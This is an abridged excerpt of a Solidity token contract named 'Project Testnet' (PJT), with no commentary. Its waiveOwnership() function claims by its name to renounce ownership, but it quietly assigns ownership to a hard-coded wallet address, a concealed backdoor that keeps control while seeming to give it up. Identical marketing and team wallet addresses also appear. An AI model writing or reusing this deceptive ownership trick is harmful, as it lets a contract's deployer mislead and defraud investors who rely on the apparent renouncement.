...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xEB9cBa40d0E5754747030c0Fc68aCf2529aDeBD7);
    }
...
contract ProjectTestnet is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Project Testnet";
    string private _symbol = "PJT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xc5E4e06b90e53660bA6c5aD9A8E14ceFEB7BCf21);
    address payable public teamWalletAddress = payable(0xc5E4e06b90e53660bA6c5aD9A8E14ceFEB7BCf21);
